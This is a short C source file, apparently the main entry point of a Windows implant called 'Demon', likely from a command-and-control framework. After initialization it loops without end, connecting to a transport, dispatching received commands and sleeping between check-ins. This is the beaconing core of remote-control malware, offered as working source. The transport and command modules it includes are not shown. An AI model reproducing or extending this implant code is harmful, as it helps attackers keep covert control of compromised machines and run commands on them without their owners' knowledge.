#include <Demon.h>

#include <Core/Command.h>
#include <Core/Transport.h>

PINSTANCE Instance = & ( ( INSTANCE ) { } );

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    PUTS( "Start" )

    DxInitialization(  );

    do
    {
        if ( ! Instance->Session.Connected )
        {
            if ( TransportInit( NULL ) )
                CommandDispatcher();
        }

        Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );

    } while ( TRUE );
}
